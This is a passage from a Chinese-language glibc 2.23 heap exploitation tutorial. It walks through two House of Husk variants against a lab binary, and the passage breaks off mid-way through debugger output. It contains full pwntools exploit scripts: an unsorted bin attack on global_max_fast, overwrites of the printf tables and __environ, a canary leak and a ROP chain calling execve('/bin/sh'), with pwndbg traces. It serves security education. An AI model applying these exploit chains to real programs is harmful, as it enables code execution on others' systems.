PRINTF_ARGINFO = libc.symbols["__printf_arginfo_table"]

# house_of_husk
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
conn.sendafter(b"Enter introduction: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x500, b"A" * 0x8)
malloc(1, offset2size(PRINTF_FUNCTABLE - FASTBIN_Y), b"B" * 0x8)
malloc(2, offset2size(PRINTF_ARGINFO - FASTBIN_Y), b"C" * 0x8)
malloc(3, 0x500, b"D" * 0x8)
delete(0)
author_name, introduction, content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
main_arena = libc.sym["main_arena"]
fastbinsY = libc.sym["main_arena"] + 0x8
global_max_fast = libc.sym["global_max_fast"]
__printf_function_table = libc.sym["__printf_function_table"]
__printf_arginfo_table = libc.sym["__printf_arginfo_table"]
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"libc base: {hex(libc.address)}")
log.info(f"main_arena addr: {hex(main_arena)}")
log.info(f"fastbinsY addr: {hex(fastbinsY)}")
log.info(f"global_max_fast addr: {hex(global_max_fast)}")
log.info(f"__printf_function_table addr: {hex(__printf_function_table)}")
log.info(f"__printf_arginfo_table addr: {hex(__printf_arginfo_table)}")
log.info(f"one_gadget addr: {hex(one_gadget)}")

payload = b"\x00" * (ord("s") - 2) * 8 + p64(one_gadget)
edit(2, len(payload), payload)
payload = p64(main_arena88) + p64(global_max_fast - 0x10)
edit(0, len(payload), payload)
malloc(0, 0x500, b"A" * 0x8)
delete(1)
delete(2)
conn.sendlineafter(b"> ", b"4")
cmd = b"cat src/2.23/house_of_husk/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在技术操作的初始内存布局阶段，连续进行了四次堆分配，依次得到 **`chunks[0]`**、**`chunks[1]`**、**`chunks[2]`** 和 **`chunks[3]`**。这一操作序列旨在建立一个可控的堆内存环境，为后续的复合技术链奠定基础。

其中，**`chunks[1]`** 和 **`chunks[2]`** 的尺寸是操作成功的关键。它们并非任意值，而是通过 **`offset2size`** 函数（其内部实现基于公式 **`size = (delta * 2) + 0x20 - 0x10`**）计算得出的**特定尺寸**。计算时，函数分别以两个关键全局符号 **`__printf_function_table`** 和 **`__printf_arginfo_table`** 的地址与 **`main_arena->fastbinsY`** 基址的偏移量作为 **`delta`** 输入。其**核心目的**是：当这两个块在后续步骤中被释放时，它们将根据其特定尺寸被分配器插入 **`fastbinsY`** 数组中两个由 `delta` 决定的索引位置。这实质上**预先计算并“预留”了未来用于实现指定地址写入的两个指针槽位**，使得对 `fastbinsY` 数组的访问能够精确地计算定位到上述两个目标全局变量所在的地址。

与此同时，**`chunks[0]`** 和 **`chunks[3]`** 被分配为较大的尺寸（例如 `0x500`）。它们的主要作用包括：
- **1)** 作为大尺寸块确保其被释放后进入 **unsorted bin**，从而为后续的 **unsorted bin 操作** 提供操作对象以获取地址信息并修改 `global_max_fast`；
- **2)** 在物理内存上隔离目标块，防止其与 `top chunk` 合并，并确保特定的堆布局得以维持。

因此，这组连续的分配操作是一次**精确的堆空间预先计算与布局**。它提前构造了用于地址获取、全局变量修改以及最终实现指定地址写入的全部内存载体，确保了后续 **House of Husk 其一** 技术能够按计划执行。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5ac809cf3000
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x5ac809cf3510
Size: 0x9360 (with flag bits: 0x9361)

Allocated chunk | PREV_INUSE
Addr: 0x5ac809cfc870
Size: 0x1870 (with flag bits: 0x1871)

Allocated chunk | PREV_INUSE
Addr: 0x5ac809cfe0e0
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5ac809cfe5f0
Size: 0x15a10 (with flag bits: 0x15a11)

pwndbg> 
```

在技术链的初始信息收集阶段，**释放**先前申请的大尺寸堆块 **`chunks[0]`**（大小为 `0x500`）。由于其尺寸超出了 `fast bin` 的管理阈值，该块被置入 **`unsorted bin`** 的空闲链表中。

释放后，`chunks[0]` 的 **`fd`**（前向指针）和 **`bk`**（后向指针）将被分配器更新，指向 `main_arena` 中 `unsorted bin` 的管理结构地址。在 glibc 的实现中，当 `unsorted bin` 中仅有一个空闲块时，其 `fd` 和 `bk` 均指向 `main_arena` 内部一个固定偏移（通常为 `main_arena+88` 或 `main_arena+96`，具体取决于版本和架构）的地址。**该地址是 libc 数据段中的一个固定位置，与 libc 基址存在静态偏移关系**。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5ac809cf3000 —▸ 0x77292d58db78 (main_arena+88) ◂— 0x5ac809cf3000
pwndbg> 
```

在此次 **House of Husk 其一** 技术演示中，选择进行操作的标准格式控制符为 **`%s`**。其原理并非直接干预 `printf` 对 `%s` 的默认解析逻辑，而是通过修改 **`__printf_arginfo_table`** 所指向的自定义函数指针表，将 `%s` 对应的处理函数设置为预设的目标地址。

为实现此目的，在 **`chunks[2]`** 所对应的内存区域内，预先**构造了一个完整的、伪造的 `__printf_arginfo_table` 函数指针数组结构**。该数组在内存中表现为一个连续的、每个元素为8字节（64位系统）的函数指针序列。数组的索引与格式控制符的ASCII值相关联。

具体构造策略如下：
1.  **计算精确偏移**：`%s` 对应的ASCII值为 **115**。在glibc的实现中，由于存在chunk header，需要减去`2 * sizeof(long)`。因此，`%s` 在该表中的有效索引为 `ord('s') - 2 = 113`。
2.  **构造payload**：向 `chunks[2]` 写入的payload构造为：`b"\x00" * (ord("s") - 2) * 8 + p64(one_gadget)`。这表示：
    *   首先填充 `(113 * 8) = 904` 字节的零（`NULL`），这相当于将索引0至112的所有自定义格式符的处理函数指针初始化为空，确保它们不会干扰流程。
    *   随后，在紧接着的8字节（即索引113的位置）处，写入**one_gadget**（或 `system` 等）的地址。这正好是 `%s` 控制符在自定义表中对应的函数指针槽位。

因此，当后续的 `printf` 调用解析到 `%s` 时，由于 `__printf_function_table` 已被设为非空，它会查询 `__printf_arginfo_table`。此时该表指针已被修改为指向 `chunks[2]` 的起始地址，`printf` 将访问该伪造数组中偏移为 `115*8` 的位置，并取出预先放置的 **one_gadget** 地址作为函数指针执行，从而**实现从格式化字符串解析到控制流导向的转换**。此次数据布局是连接内存操作与控制流实现的最后且关键的数据准备步骤。

```bash
pwndbg> x/1gx 0x5ac809cfc880-0x10+115*8
0x5ac809cfcc08: 0x00005ac7eae2b8d5  <= one_gadget
pwndbg> 
```

在完成 libc 基址获取后，技术链的下一个关键步骤是部署 **unsorted bin 操作**，其核心目标是**修改全局变量 `global_max_fast`**，以改变 fast bin 的尺寸管理规则，为后续 **house of husk 其一** 创造条件。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5ac809cf3000 —▸ 0x77292d58db78 (main_arena+88) ◂— 0x5ac809cf3000
BK: 0x5ac809cf3000 —▸ 0x77292d58f7c8 (__free_hook) ◂— 0
pwndbg> x/4gx 0x5ac809cf3000
0x5ac809cf3000: 0x0000000000000000      0x0000000000000511
0x5ac809cf3010: 0x000077292d58db78      0x000077292d58f7c8
pwndbg> x/1gx &global_max_fast 
0x77292d58f7d8 <global_max_fast>:       0x0000000000000080
pwndbg> 
```

在完成对 **unsorted bin** 中目标块（即先前释放的 `chunks[0]`）的 `bk` 指针的修改后，通过 **`malloc`** 请求分配一块特定大小的内存（例如，与 `chunks[0]` 原始大小相匹配）。此操作旨在**触发分配器对 unsorted bin 的遍历和整理逻辑，从而执行预设的 `unsorted bin` 操作**。

具体而言，当 `malloc` 被调用并遍历 unsorted bin 以寻找合适块时，会将该目标块从链表中摘除。此过程涉及内部的 `unlink` 写操作，具体行为是：`BK->fd = FD`。由于此前已将该块的 `bk` 指针修改为 **`&global_max_fast - 0x10`**，而 `fd` 指针仍指向 `main_arena` 内的一个地址，因此该写操作**会向地址 `&global_max_fast - 0x10 + 0x10`（即 `global_max_fast` 自身）写入一个较大的 libc 地址（通常是 `main_arena` 结构内部的地址）**。

**这次 `malloc` 调用是触发后续操作的关键步骤**。它并非为了获取可用内存，而是主动引导分配器执行一段预设的指针解引用与写入操作。成功执行后，`global_max_fast` 的值被修改为一个远超正常范围（如 0x80）的数值。这**实质上移除了 fast bin 的常规尺寸限制校验**，使得后续特定构造的较大尺寸堆块在释放时也能进入 fast bin 管理路径，为利用 `fastbin_index` 的索引计算特性（**House of Husk 其一**）创造了必要条件。至此，堆分配器的全局管理规则被改变，技术链进入下一阶段。

```bash
pwndbg> x/1gx &global_max_fast 
0x77292d58f7d8 <global_max_fast>:       0x000077292d58db78
pwndbg> x/1gx &__printf_function_table
0x77292d5924c8 <__printf_function_table>:       0x0000000000000000
pwndbg> x/1gx &__printf_arginfo_table
0x77292d58e750 <__printf_arginfo_table>:        0x0000000000000000
pwndbg> 
```

在成功通过 **`unsorted bin` 操作** 将 **`global_max_fast`** 修改为一个较大值后，堆分配器对 fast bin 的常规尺寸限制已被改变。此时，按计划依次执行两个关键的释放操作，以定向修改 `printf` 自定义格式符处理机制的核心全局数据结构：

1.  **释放 `chunks[1]` 以修改 `__printf_function_table`**：
    `chunks[1]` 的尺寸是预先通过公式 **`offset2size(PRINTF_FUNCTABLE - FASTBIN_Y)`** 计算得出的。当调用 `free(chunks[1])` 时，由于其尺寸现已满足被 `global_max_fast` 扩大后的阈值，该块进入 fast bin 释放路径。分配器根据其特定尺寸计算出索引 `idx`，该索引值恰好等于 **`__printf_function_table` 与 `main_arena->fastbinsY` 基址的偏移 `delta`**。因此，`main_arena->fastbinsY[idx]` 实际指向了 `__printf_function_table` 的地址。此次释放操作会通过原子比较交换（`catomic_compare_and_exchange_val_rel`）将 **`__printf_function_table` 的值更新为 `chunks[1]` 的堆地址**。这标志着 `printf` 的自定义格式符处理机制被启用，因为该指针不再为 `NULL`。

2.  **释放 `chunks[2]` 以修改 `__printf_arginfo_table`**：
    紧接着，释放同样具有特定尺寸的 **`chunks[2]`**（其尺寸由 **`offset2size(PRINTF_ARGINFO - FASTBIN_Y)`** 计算）。此操作与上述过程同理，但计算出的索引将 `main_arena->fastbinsY` 的访问偏移至 **`__printf_arginfo_table`** 的地址。因此，此次释放成功将 **`__printf_arginfo_table` 的值更新为 `chunks[2]` 的堆地址**。由于 `chunks[2]` 的内存中已预先布置了伪造的函数指针数组（其中 `%s` 对应的槽位被设置为 **`one_gadget`** 地址），至此，`printf` 在解析到 `%s` 时将使用预设的函数指针。

**这两个连续的释放操作是 House of Husk 其一 技术的核心步骤**。它们利用被修改规则的 fast bin 机制，将两次 `free` 调用转化为两次精确的指定地址写操作，分别完成了对 `printf` 内部两个关键函数表指针的修改。这为后续通过一个简单的 `printf` 调用实现控制流转向（如启动 shell）完成了必要的数据准备。

```bash
pwndbg> x/1gx &__printf_function_table
0x77292d5924c8 <__printf_function_table>:       0x00005ac809cf3510
pwndbg> x/1gx &__printf_arginfo_table
0x77292d58e750 <__printf_arginfo_table>:        0x00005ac809cfc870
pwndbg> x/1gx 0x5ac809cfc870+115*8
0x5ac809cfcc08: 0x00005ac7eae2b8d5 <= one_gadget
pwndbg> 
```

触发包含`%s`的输出函数，进入[vfprintf](https://elixir.bootlin.com/glibc/glibc-2.23/source/stdio-common/vfprintf.c#L1328)。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1328
   1322 
   1323   /* If we only have to print a simple string, return now.  */
   1324   if (*f == L_('\0'))
   1325     goto all_done;
   1326 
   1327   /* Use the slow path in case any printf handler is registered.  */
 ► 1328   if (__glibc_unlikely (__printf_function_table != NULL
   1329                         || __printf_modifier_table != NULL
   1330                         || __printf_va_arg_table != NULL))
   1331     goto do_positional;
   1332 
```

此时，满足__printf_function_table != NULL条件，进入do_positional。

```c
/* The function itself.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap)
{
...
/* Hand off processing for positional parameters.  */
do_positional:
if (__glibc_unlikely (workstart != NULL))
  {
    free (workstart);
    workstart = NULL;
  }
done = printf_positional (s, format, readonly_format, ap, &ap_save,
			    done, nspecs_done, lead_str_end, work_buffer,
			    save_errno, grouping, thousands_sep);

all_done:
if (__glibc_unlikely (workstart != NULL))
  free (workstart);
/* Unlock the stream.  */
_IO_funlockfile (s);
_IO_cleanup_region_end (0);

return done;
}
```

接着进入printf_positional函数。

```c
static int
printf_positional (_IO_FILE *s, const CHAR_T *format, int readonly_format,
		   va_list ap, va_list *ap_savep, int done, int nspecs_done,
		   const UCHAR_T *lead_str_end,
		   CHAR_T *work_buffer, int save_errno,
		   const char *grouping, THOUSANDS_SEP_T thousands_sep)
{
...
      /* Parse the format specifier.  */
#ifdef COMPILE_WPRINTF
      nargs += __parse_one_specwc (f, nargs, &specs[nspecs], &max_ref_arg);
#else
      nargs += __parse_one_specmb (f, nargs, &specs[nspecs], &max_ref_arg);
#endif
    }
```

再进入__parse_one_specmb函数。
   
```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/printf-parsemb.c:315
   309   if (__builtin_expect (__printf_function_table == NULL, 1)
   310       || spec->info.spec > UCHAR_MAX
   311       || __printf_arginfo_table[spec->info.spec] == NULL
   312       /* We don't try to get the types for all arguments if the format
   313          uses more than one.  The normal case is covered though.  If
   314          the call returns -1 we continue with the normal specifiers.  */
 ► 315       || (int) (spec->ndata_args = (*__printf_arginfo_table[spec->info.spec])
   316                                    (&spec->info, 1, &spec->data_arg_type,
   317                                     &spec->size)) < 0)
   318     {
   319       /* Find the data argument types of a built-in spec.  */
   320       spec->ndata_args = 1;
   321 
   322       switch (spec->info.spec)
   
pwndbg> p/x spec->info.spec
$3 = 0x73
pwndbg> p/x __printf_arginfo_table[spec->info.spec]
$4 = 0x5ac7eae2b8d5
pwndbg> x/6i 0x5ac7eae2b8d5
   0x5ac7eae2b8d5 <magic>:      endbr64
   0x5ac7eae2b8d9 <magic+4>:    push   rbp
   0x5ac7eae2b8da <magic+5>:    mov    rbp,rsp
   0x5ac7eae2b8dd <magic+8>:    lea    rax,[rip+0x86f]        # 0x5ac7eae2c153
   0x5ac7eae2b8e4 <magic+15>:   mov    rdi,rax
   0x5ac7eae2b8e7 <magic+18>:   call   0x5ac7eae2b180 <system@plt>
pwndbg> 
```

使用one_gadget获取shell的控制权轻而易举。


### 1-23 house of husk其二

**House of Husk** 的第二种变体同样基于公式 **`size = (delta * 2) + 0x20 - 0x10`** 所提供的指定地址写操作，这与 **House of Corrosion** 及前述第一种 **House of Husk** 变体在初始技术链上是一致的。然而，其最终的操作目标与实现路径存在本质区别：它不再针对 `printf` 的自定义格式符处理机制，而是转向了**修改进程环境以影响栈上数据**，从而实现控制流转向。

该变体的核心是**利用 glibc 中的全局变量 `__environ`**。`__environ` 本身是一个指针，指向一个指针数组（即 `char **environ`），该数组存储着进程的环境变量字符串地址。更重要的是，在典型的栈布局中，这个**环境变量数组本身位于栈内存的高地址区域**，且其位置相对固定。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_husk_again/exploit.py)。

核心利用代码如下：

```python
FASTBIN_Y = libc.symbols["main_arena"] + 0x8
GLOBAL_MAX_FAST = libc.symbols["global_max_fast"]
ENVIRON = libc.symbols["__environ"]

# house of husk
fake_size = (offset2size(ENVIRON - FASTBIN_Y) + 0x10) | 1
conn.sendafter(b"Enter author name: ", p64(fake_size))
log.info(f"fake size: {hex(fake_size)}")
malloc(0, 0x500)
malloc(1, offset2size(ENVIRON - FASTBIN_Y))
malloc(2, 0x500)
delete(0)
content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
main_arena = libc.sym["main_arena"]
fastbinsY = libc.sym["main_arena"] + 0x8
global_max_fast = libc.sym["global_max_fast"]
__environ = libc.sym["__environ"]
pop_rdi = libc.address + 0x00000000000202F1
pop_rsi = libc.address + 0x000000000001FEE3
pop_rdx = libc.address + 0x0000000000001B92
execve_addr = libc.sym["execve"]
log.info(f"libc base: {hex(libc.address)}")
log.info(f"main_arena addr: {hex(main_arena)}")
log.info(f"fastbinsY addr: {hex(fastbinsY)}")
log.info(f"global_max_fast addr: {hex(global_max_fast)}")
log.info(f"__environ addr: {hex(__environ)}")
log.info(f"pop_rdi addr: {hex(pop_rdi)}")
log.info(f"pop_rsi addr: {hex(pop_rsi)}")
log.info(f"pop_rdx addr: {hex(pop_rdx)}")
log.info(f"execve_addr addr: {hex(execve_addr)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

payload = p64(main_arena88) + p64(global_max_fast - 0x10)
edit(0, len(payload), payload)
malloc(0, 0x500)
delete(1)
content = show(1)
env_addr = u64(content[:6].ljust(8, b"\x00"))
log.info(f"env addr: {hex(env_addr)}")

fake_chunk_addr = env_addr - 0x130
edit(1, 0x8, p64(fake_chunk_addr))
malloc(1, offset2size(ENVIRON - FASTBIN_Y))
malloc(3, offset2size(ENVIRON - FASTBIN_Y))

payload = b"A" * 0x20 + b"A" * 0x1
edit(3, len(payload), payload)
content = show(3)
canary = u64(content[0x21 : 0x21 + 8]) << 8
log.info(f"canary: {hex(canary)}")

canary = ctypes.c_uint64(canary).value
payload = b"A" * 0x20 + p64(canary) + p64(0)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(execve_addr)
edit(3, len(payload), payload)

exit_proc()
conn.recvline()
cmd = b"cat src/2.23/house_of_husk_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在技术操作的初始内存布局阶段，代码执行了连续三次堆分配操作，依次获得 **`chunks[0]`**、**`chunks[1]`** 和 **`chunks[2]`**。这一布局策略旨在为后续组合运用 **unsorted bin 操作** 与 **House of Husk 其二** 方法构建一个精确可控的堆状态。

其中，**`chunks[1]`** 的尺寸是关键的操作向量。其大小并非随意指定，而是通过核心公式衍生函数 **`offset2size(ENVIRON - FASTBIN_Y)`** 计算得出的**特定尺寸（evil_size）**。该计算以全局变量 **`__environ`** 的地址与 **`main_arena->fastbinsY`** 数组基址之间的偏移量 **`delta`** 为输入，其**核心目的**是：当 `global_max_fast` 被后续操作修改后，释放此尺寸的 chunk 会使其被链入 `fastbinsY` 数组，且计算出的索引 `idx` 恰好使得 `&fastbinsY[idx]` 指向 **`__environ`** 的地址。这为后续通过一次 `free` 操作实现**指定地址写**以覆盖 `__environ` 指针奠定了数学基础。

与此同时，**`chunks[0]`** 和 **`chunks[2]`** 均被分配为较大的尺寸（`0x500`），它们的主要作用包括：
1.  **作为操作对象**：`chunks[0]` 将被立即释放至 **unsorted bin**，用于获取 `main_arena` 地址以计算 libc 基址，并作为实施 **unsorted bin 操作** 的载体以修改 `global_max_fast`。
2.  **提供内存隔离**：`chunks[2]` 作为一个大型屏障块，可以防止 `top chunk` 与目标块 `chunks[1]` 发生合并，确保堆布局的稳定性和可预测性。

因此，这次连续分配是一次**精密的预先布局**。它同步准备了用于**信息获取与全局状态修改**的载体（`chunks[0]`）和用于**实现最终指定地址写操作**的载体（`chunks[1]`），为技术链的逐步展开构建了必需的初始内存结构。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x589ea29c5000
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x589ea29c5510
Size: 0x4940 (with flag bits: 0x4941)

Allocated chunk | PREV_INUSE
Addr: 0x589ea29c9e50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x589ea29ca360
Size: 0x1bca0 (with flag bits: 0x1bca1)

pwndbg> 
```

在技术链的初始化阶段，**释放**了预先分配的大尺寸堆块 **`chunks[0]`**（大小为 `0x500`）。由于其尺寸超过了 `fast bin` 的默认管理阈值，该块被分配器置入 **`unsorted bin`** 的空闲链表中。

在 glibc 的管理机制下，当一个块被链接入 `unsorted bin` 且成为该链表中唯一的空闲块时，其 **`fd`**（前向指针）和 **`bk`**（后向指针）均会被更新，指向 `main_arena` 内部的一个固定管理结构地址（通常偏移为 `main_arena+88` 或 `main_arena+96`）。**此地址位于 libc 的数据段中，与 libc 的加载基址存在一个静态的、确定的偏移量**。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x589ea29c5000 —▸ 0x7db0f978db78 (main_arena+88) ◂— 0x589ea29c5000
pwndbg> 
```

在成功定位 libc 基址后，技术链进入关键的**全局参数调整阶段**，其核心是执行 **unsorted bin 操作** 以修改 **`global_max_fast`** 全局变量。此操作的**主要目的**是改变 fast bin 的尺寸管理规则，为后续实施 **House of Husk 其二** 技术链奠定基础。

```bash
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x589ea29c5000 —▸ 0x7db0f978db78 (main_arena+88) ◂— 0x589ea29c5000
BK: 0x589ea29c5000 —▸ 0x7db0f978f7c8 (__free_hook) ◂— 0
pwndbg> x/4gx 0x589ea29c5000
0x589ea29c5000: 0x0000000000000000      0x0000000000000511
0x589ea29c5010: 0x00007db0f978db78      0x00007db0f978f7c8
pwndbg> x/1gx &global_max_fast 
0x7db0f978f7d8 <global_max_fast>:       0x0000000000000080
pwndbg> 
```

在完成对 **unsorted bin** 中目标块（即先前释放的 `chunks[0]`）的 `bk` 指针的修改后，通过 **`malloc`** 请求分配一块特定大小的内存（例如，与 `chunks[0]` 原始大小相匹配）。此操作旨在**触发分配器对 unsorted bin 的遍历和整理逻辑，从而执行预设的 `unsorted bin` 操作**。

具体而言，当 `malloc` 被调用并遍历 unsorted bin 以寻找合适块时，会将该目标块从链表中摘除。此过程涉及其内部的 `unlink` 写操作，具体行为是：`BK->fd = FD`。由于已将该块的 `bk` 指针修改为 **`&global_max_fast - 0x10`**，而 `fd` 指针仍指向 `main_arena` 内的一个地址，因此该写操作**会向地址 `&global_max_fast - 0x10 + 0x10`（即 `global_max_fast` 自身）写入一个较大的 libc 地址（通常是 `main_arena+88` 附近的地址）**。

**这次 `malloc` 调用是触发后续步骤的关键操作**。它并非为了获取可用内存，而是主动引导分配器执行一段预设的指针解引用与写入操作。成功执行后，`global_max_fast` 的值被修改为一个远超正常范围（如 0x80）的较大数值。这**实质性地改变了 fast bin 的常规尺寸限制**，使得后续特定构造的较大尺寸堆块在释放时也能进入 fast bin 管理路径，为利用 `fastbin_index` 的索引计算特性（**House of Corrosion**）创造了条件。至此，堆分配器的全局管理规则被更新，技术链进入下一阶段。

```bash
pwndbg> x/1gx &global_max_fast 
0x7db0f978f7d8 <global_max_fast>:       0x00007db0f978db78
pwndbg> p/x chunks[1]
$1 = {
  size = 0x4930,
  addr = 0x589ea29c5520
}
pwndbg> x/4gx 0x589ea29c5520-0x10
0x589ea29c5510: 0x0000000000000510      0x0000000000004941
0x589ea29c5520: 0x0000000000000000      0x0000000000000000
pwndbg>
```

在成功通过 **unsorted bin 操作** 将 **`global_max_fast`** 修改为一个较大值后，堆分配器对 fast bin 的常规尺寸限制已被改变。此时，执行 **`free(chunks[1])`** 操作，释放预先构造的特大尺寸堆块 `chunks[1]`。

由于其尺寸 `evil_size` 现已满足被修改后的 `global_max_fast` 阈值，该块进入 **fast bin 释放路径**。分配器根据其特定尺寸计算 `fastbin_index`，得到的索引值 `idx` 恰好使得 `&main_arena->fastbinsY[idx]` 指向全局变量 **`__environ`** 的地址。在 fast bin 的链接操作中，系统会通过原子操作尝试将 `chunks[1]` 链入该索引对应的链表头。

**此释放操作的核心结果是**：原本存储在 **`__environ`** 中的值（即指向进程环境变量指针数组的指针）被更新为 **`chunks[1]` 自身的堆地址**。这标志着成功修改了 **`__environ`** 这个关键全局指针，使其指向一块可控的堆内存。

与此同时，作为 fast bin 块的标准操作，`chunks[1]` 的 **`fd`** 指针会被更新为原 `fastbinsY[idx]` 槽位中的旧值（即原来的 `__environ` 值）。因此，描述中“将 environ 地址写入 chunks[1]->fd”是此过程的一个**附带结果**，它为后续读取原始的 `__environ` 值（即栈上环境变量数组的真实地址）提供了可能，便于计算栈布局。

**此次释放是技术链的关键步骤**。它将一次堆块释放，转化为一次精确的**指定地址写**，将进程的环境指针重定向到可控的堆内存。这为后续在堆上构造环境变量数组，并进而通过环境变量机制影响栈上的返回地址或函数指针，最终实现控制流转向（如执行 ROP 链）奠定了基础。

```bash
pwndbg> x/4gx 0x589ea29c5520-0x10
0x589ea29c5510: 0x0000000000000510      0x0000000000004941
0x589ea29c5520: 0x00007ffde64b2ce8      0x0000000000000000
pwndbg> x/1gx &__environ
0x7db0f9a23100 <environ>:       0x00007ffde64b2ce8
pwndbg> stack -f
00:0000│ rsp 0x7ffde64b2ba8 —▸ 0x589e9aa1688a (main+266) ◂— jmp main+309
01:0008│-040 0x7ffde64b2bb0 ◂— 1
02:0010│-038 0x7ffde64b2bb8 ◂— 6
03:0018│-030 0x7ffde64b2bc0 ◂— 0x4941 /* 'AI' */
04:0020│-028 0x7ffde64b2bc8 —▸ 0x7db0f94332c0 (__internal_atexit+21) ◂— test rax, rax
05:0028│-020 0x7ffde64b2bd0 ◂— 0
06:0030│-018 0x7ffde64b2bd8 ◂— 0
07:0038│-010 0x7ffde64b2be0 —▸ 0x589e9aa161c0 (_start) ◂— endbr64
08:0040│-008 0x7ffde64b2be8 ◂— 0xdcd6c93f0d59c900
09:0048│ rbp 0x7ffde64b2bf0 ◂— 0
0a:0050│+008 0x7ffde64b2bf8 —▸ 0x7db0f941fc39 (__libc_start_main+385) ◂— jmp __libc_start_main+464
pwndbg> p/x 0x00007ffde64b2ce8-0x7ffde64b2bb8
$2 = 0x130
pwndbg> 
```

在成功通过已控制的 **`__environ`** 指针获取栈地址（具体为环境变量数组的地址）后，操作进入下一关键阶段：**在栈内存中构造一个符合堆管理器元数据要求的指定结构**，并修改 **fast bin** 的 **`fd`** 指针指向该结构，从而为在栈上实现可控的内存分配做准备。

具体步骤如下：
1.  **定位与计算**：从已获取的栈地址（例如 `env_addr`）出发，根据当前栈帧布局（可能通过调试确定），**计算出一个合适的栈地址作为目标结构的起始位置**（例如 `env_addr - 0x130`）。此地址需满足堆块对齐要求，且其周边内存状态可控或可预测，以便布置对应的结构元数据。
2.  **构造结构元数据**：在选定的栈地址处，布置对应的结构头部。这至少需要设置一个**合法的 `size` 字段**，其大小需与后续操作中拟分配的 fast bin 尺寸相匹配，且其 `PREV_INUSE` 位通常置 1。此外，为了通过分配器的完整性检查，可能还需确保相邻的“下一个堆块”的 `size` 字段也呈现为合法值。
3.  **修改 fast bin 链表**：利用已获得的地址写入能力（例如通过 **house of husk 其二** 已实现的操作），修改某个 fast bin 链表头指针（即 `main_arena->fastbinsY[target_index]`）或修改某个已释放 fast chunk 的 **`fd`** 指针。**此操作旨在将目标栈地址插入到目标 fast bin 链表中**。通常，会将一个已控制的 fast chunk 的 `fd` 指针修改为该栈地址，从而将其链入空闲链表。
4.  **触发分配，实现栈上操作**：当程序后续通过 **`malloc`** 请求相应尺寸的内存时，分配器会从已被修改的 fast bin 链表中取出块返回。由于链表已调整，分配器**会将该栈地址作为一块“空闲内存”返回给调用者**。至此，获得了在栈上进行可控写入操作的能力。

**此步骤是连接堆操作与栈操作的桥梁**。它通过修改堆管理器的内部链表，将内存分配引导至栈空间，从而可以用于覆盖**返回地址**、**保存的寄存器**或**函数指针**等关键栈上数据，为后续的控制流操作提供条件。

```bash
pwndbg> x/4gx 0x589ea29c5520-0x10
0x589ea29c5510: 0x0000000000000510      0x0000000000004941
0x589ea29c5520: 0x00007ffde64b2bb8      0x0000000000000000
pwndbg> 
```

在完成对 fast bin 链表的修改，将指向 **栈上目标结构** 的地址链接入其中后，执行两次连续的 **`malloc`** 申请：

1.  **申请 `chunks[1]`**：首先申请与之前释放的 `chunks[1]` 相同的特定尺寸。分配器会从被修改的 fast bin 链表中取出第一个节点，这恰好是**原始的 `chunks[1]` 堆地址**。此次分配的主要目的是**将该特定块从链表中移除**，使得链表中紧随其后的下一个节点——即**指向栈上目标结构的指针**——成为新的链表头。

2.  **申请 `chunks[3]`**：紧接着，再次申请相同尺寸的内存。此时，fast bin 链表的头指针已指向**栈上目标结构的地址**。因此，此次分配成功**将位于栈上的结构作为一块内存返回给用户**，并赋值给 `chunks[3]`。

**获得 `chunks[3]` 意味着用户取得了对该栈内存区域的写入权限**。现在可以通过向 `chunks[3]` 写入数据，**直接修改栈上的内容**。这通常用于实现以下关键步骤：
*   **获取栈金丝雀（Canary）**：通过精确的偏移计算，读取金丝雀的值。
*   **部署ROP链**：在相应的返回地址位置，布置一系列预设的gadget地址，最终指向目标函数。
*   **实现控制流转向**：当当前函数返回时，其返回地址已被更新，控制流将转向预设的gadget，开始执行ROP链。

因此，这两次连续的分配是**将“内存写入”能力转化为“栈空间写入”乃至“控制流实现”的关键步骤**。`chunks[3]` 作为指向栈的接口，使得能够对栈上的控制流数据进行指定修改。

```bash
pwndbg> p/x chunks[3]
$3 = {
  size = 0x4930,
  addr = 0x7ffde64b2bc8
}
pwndbg> telescope 0x7ffde64b2bc8
00:0000│-028 0x7ffde64b2bc8 —▸ 0x7db0f94332c0 (__internal_atexit+21) ◂— test rax, rax
01:0008│-020 0x7ffde64b2bd0 ◂— 0
02:0010│-018 0x7ffde64b2bd8 ◂— 0
03:0018│-010 0x7ffde64b2be0 —▸ 0x589e9aa161c0 (_start) ◂— endbr64
